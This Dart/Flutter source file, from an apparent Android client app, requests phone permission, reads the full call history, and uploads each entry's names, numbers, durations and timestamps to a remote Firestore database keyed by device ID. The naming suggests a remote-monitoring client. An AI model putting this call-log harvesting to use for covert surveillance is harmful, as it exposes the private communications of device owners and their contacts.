import 'package:androclient/constant/firebase.constant.dart';
import 'package:androclient/service/device.dart';
import 'package:call_log/call_log.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:permission_handler/permission_handler.dart';

Future<PermissionStatus> _getCallLogPermission() async {
  final PermissionStatus callLogPermission = await Permission.phone.status;
  print(callLogPermission);
  if (callLogPermission == PermissionStatus.granted) {
    print('Permission granted');
  } else if (callLogPermission == PermissionStatus.denied) {
    print(
        'Denied. Show a dialog with a reason and again ask for the permission.');
    final PermissionStatus askedpermission = await Permission.phone.request();
    return askedpermission;
  } else if (callLogPermission == PermissionStatus.permanentlyDenied) {
    print('Take the user to the settings page.');
    await openAppSettings();
  }
  return callLogPermission;
}

Future<void> getCallLogs() async {
  final PermissionStatus permissionStatus = await _getCallLogPermission();

  if (permissionStatus == PermissionStatus.granted) {
    // method 1
    Iterable<CallLogEntry> logs = await CallLog.get();
    print("logs");
    String? androidId = await getIdentity();
    CollectionReference logsCollection =
        firestore.collection('client').doc(androidId).collection("logs");
    var batch = firestore.batch();
    for (var i = 0; i < logs.length; i++) {
      if (i % 300 == 0) {
        await batch.commit();
        batch = firestore.batch();
      }
      DocumentReference logDocument =
          logsCollection.doc(logs.elementAt(i).timestamp.toString());
      batch.set(
        logDocument,
        Map<String, dynamic>.from(
          {
            "cachedMatchedNumber": logs.elementAt(i).cachedMatchedNumber,
            "cachedNumberLabel": logs.elementAt(i).cachedNumberLabel,
            "cachedNumberType": logs.elementAt(i).cachedNumberType,
            "callType": getCallType(logs.elementAt(i).callType),
            "duration": logs.elementAt(i).duration,
            "formattedNumber": logs.elementAt(i).formattedNumber,
            "name": logs.elementAt(i).name,
            "number": logs.elementAt(i).number,
            "phoneAccountId": logs.elementAt(i).phoneAccountId,
            "simDisplayName": logs.elementAt(i).simDisplayName,
            "timestamp": logs.elementAt(i).timestamp,
          },
        ),
      );
    }
    await batch.commit();
  }
}

getCallType(callType) {
  if (callType == CallType.incoming) {
    return "incoming";
  } else if (callType == CallType.outgoing) {
    return "outgoing";
  } else if (callType == CallType.missed) {
    return "missed";
  } else if (callType == CallType.missed) {
    return "missed";
  } else if (callType == CallType.voiceMail) {
    return "voiceMail";
  } else if (callType == CallType.rejected) {
    return "rejected";
  } else if (callType == CallType.blocked) {
    return "blocked";
  } else if (callType == CallType.answeredExternally) {
    return "answeredExternally";
  } else if (callType == CallType.unknown) {
    return "unknown";
  } else if (callType == CallType.wifiIncoming) {
    return "wifiIncoming";
  } else if (callType == CallType.wifiOutgoing) {
    return "wifiOutgoing";
  }
}
